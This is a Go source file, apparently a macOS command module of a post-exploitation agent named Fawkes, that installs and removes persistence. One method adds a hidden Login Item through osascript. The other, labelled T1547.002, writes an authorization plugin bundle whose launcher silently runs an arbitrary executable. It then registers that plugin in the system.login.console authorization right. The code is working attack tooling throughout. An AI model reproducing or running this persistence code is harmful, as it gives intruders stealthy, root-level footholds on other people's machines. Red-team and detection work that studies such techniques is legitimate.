//go:build darwin

package commands

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

// persistLoginItem handles install/remove of macOS Login Items via System Events.
func persistLoginItem(args persistArgs) structs.CommandResult {
	switch args.Action {
	case "install":
		return persistLoginItemInstall(args)
	case "remove":
		return persistLoginItemRemove(args)
	default:
		return errorf("Unknown action: %s. Use: install, remove", args.Action)
	}
}

func persistLoginItemInstall(args persistArgs) structs.CommandResult {
	if args.Path == "" {
		return errorResult("Error: path (executable to add as login item) is required")
	}

	name := "FawkesHelper"
	if args.Name != "" {
		name = args.Name
	}

	script := fmt.Sprintf(`tell application "System Events"
	make login item at end with properties {path:"%s", hidden:true, name:"%s"}
end tell`, strings.ReplaceAll(args.Path, `"`, `\"`), strings.ReplaceAll(name, `"`, `\"`))

	cmd := exec.Command("osascript", "-e", script)
	if out, err := cmd.CombinedOutput(); err != nil {
		return errorf("Failed to add login item via System Events: %v\n%s\nNote: may require Accessibility permissions in System Preferences > Privacy", err, string(out))
	}

	return successResult(fmt.Sprintf("Login Item persistence installed:\n  Name: %s\n  Path: %s\n  Hidden: true\n  Scope: current user\n  Status: will launch on next login\n\nRemove with: persist -method login-item -action remove -name %s",
		name, args.Path, name))
}

func persistLoginItemRemove(args persistArgs) structs.CommandResult {
	name := "FawkesHelper"
	if args.Name != "" {
		name = args.Name
	}

	script := fmt.Sprintf(`tell application "System Events"
	delete (every login item whose name is "%s")
end tell`, strings.ReplaceAll(name, `"`, `\"`))

	cmd := exec.Command("osascript", "-e", script)
	if out, err := cmd.CombinedOutput(); err != nil {
		return errorf("Failed to remove login item '%s': %v\n%s", name, err, string(out))
	}

	return successResult(fmt.Sprintf("Removed Login Item: %s", name))
}

// persistAuthPlugin handles install/remove of macOS Authorization Plugins (T1547.002).
func persistAuthPlugin(args persistArgs) structs.CommandResult {
	switch args.Action {
	case "install":
		return persistAuthPluginInstall(args)
	case "remove":
		return persistAuthPluginRemove(args)
	default:
		return errorf("Unknown action: %s. Use: install, remove", args.Action)
	}
}

func persistAuthPluginInstall(args persistArgs) structs.CommandResult {
	if args.Path == "" {
		return errorResult("Error: path (executable to persist) is required")
	}
	if os.Getuid() != 0 {
		return errorResult("Error: authorization plugins require root")
	}

	name := "FawkesAuth"
	if args.Name != "" {
		name = args.Name
	}

	pluginDir := "/Library/Security/SecurityAgentPlugins"
	bundleDir := filepath.Join(pluginDir, name+".bundle")
	contentsDir := filepath.Join(bundleDir, "Contents")
	macosDir := filepath.Join(contentsDir, "MacOS")

	if err := os.MkdirAll(macosDir, 0755); err != nil {
		return errorf("Failed to create bundle directory %s: %v", bundleDir, err)
	}

	plist := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>com.%s.auth</string>
    <key>CFBundlePackageType</key>
    <string>BNDL</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleExecutable</key>
    <string>%s</string>
</dict>
</plist>`, strings.ToLower(name), name)

	if err := os.WriteFile(filepath.Join(contentsDir, "Info.plist"), []byte(plist), 0644); err != nil {
		return errorf("Failed to write Info.plist: %v", err)
	}

	launcher := fmt.Sprintf("#!/bin/sh\nnohup %s &>/dev/null &\nexit 0\n", args.Path)
	launcherPath := filepath.Join(macosDir, name)
	if err := os.WriteFile(launcherPath, []byte(launcher), 0755); err != nil {
		return errorf("Failed to write launcher: %v", err)
	}

	mechanism := fmt.Sprintf("%s:auth,privileged", name)
	if err := authdbAddMechanism("system.login.console", mechanism); err != nil {
		return successResult(fmt.Sprintf("Authorization plugin bundle created at %s but failed to register in authorizationdb: %v\n\nBundle is in place — manual registration:\n  security authorizationdb read system.login.console > /tmp/auth.plist\n  # Add mechanism '%s' to the mechanisms array\n  security authorizationdb write system.login.console < /tmp/auth.plist",
			bundleDir, err, mechanism))
	}

	return successResult(fmt.Sprintf("Authorization Plugin persistence installed:\n  Bundle: %s\n  Mechanism: %s\n  Scope: system (all users, requires root)\n  Trigger: SecurityAgent loads plugin during login\n  Status: registered in system.login.console\n\nRemove with: persist -method auth-plugin -action remove -name %s",
		bundleDir, mechanism, name))
}

func persistAuthPluginRemove(args persistArgs) structs.CommandResult {
	if os.Getuid() != 0 {
		return errorResult("Error: authorization plugin removal requires root")
	}

	name := "FawkesAuth"
	if args.Name != "" {
		name = args.Name
	}

	pluginDir := "/Library/Security/SecurityAgentPlugins"
	bundleDir := filepath.Join(pluginDir, name+".bundle")

	mechanism := fmt.Sprintf("%s:auth,privileged", name)
	_ = authdbRemoveMechanism("system.login.console", mechanism)

	if _, err := os.Stat(bundleDir); err == nil {
		if err := os.RemoveAll(bundleDir); err != nil {
			return errorf("Failed to remove bundle %s: %v", bundleDir, err)
		}
		return successResult(fmt.Sprintf("Removed Authorization Plugin: %s (mechanism deregistered + bundle deleted)", bundleDir))
	}

	return errorf("No authorization plugin bundle found at %s", bundleDir)
}

// authdbAddMechanism reads a right from the authorization database, inserts a mechanism, and writes it back.
func authdbAddMechanism(right, mechanism string) error {
	readCmd := exec.Command("security", "authorizationdb", "read", right)
	output, err := readCmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("authorizationdb read failed: %w", err)
	}

	plistStr := string(output)

	if strings.Contains(plistStr, mechanism) {
		return nil
	}

	mechEntry := fmt.Sprintf("\t\t<string>%s</string>", mechanism)

	insertBefore := "\t\t<string>loginwindow:done</string>"
	if strings.Contains(plistStr, insertBefore) {
		plistStr = strings.Replace(plistStr, insertBefore, mechEntry+"\n"+insertBefore, 1)
	} else {
		lastArrayClose := strings.LastIndex(plistStr, "</array>")
		if lastArrayClose == -1 {
			return fmt.Errorf("could not find mechanisms array in authorizationdb output")
		}
		plistStr = plistStr[:lastArrayClose] + mechEntry + "\n\t" + plistStr[lastArrayClose:]
	}

	writeCmd := exec.Command("security", "authorizationdb", "write", right)
	writeCmd.Stdin = strings.NewReader(plistStr)
	if out, err := writeCmd.CombinedOutput(); err != nil {
		return fmt.Errorf("authorizationdb write failed: %w\n%s", err, string(out))
	}

	return nil
}

// authdbRemoveMechanism removes a mechanism from the authorization database for a given right.
func authdbRemoveMechanism(right, mechanism string) error {
	readCmd := exec.Command("security", "authorizationdb", "read", right)
	output, err := readCmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("authorizationdb read failed: %w", err)
	}

	plistStr := string(output)
	if !strings.Contains(plistStr, mechanism) {
		return nil
	}

	mechEntry := fmt.Sprintf("\t\t<string>%s</string>\n", mechanism)
	plistStr = strings.Replace(plistStr, mechEntry, "", 1)

	writeCmd := exec.Command("security", "authorizationdb", "write", right)
	writeCmd.Stdin = strings.NewReader(plistStr)
	if out, err := writeCmd.CombinedOutput(); err != nil {
		return fmt.Errorf("authorizationdb write failed: %w\n%s", err, string(out))
	}

	return nil
}
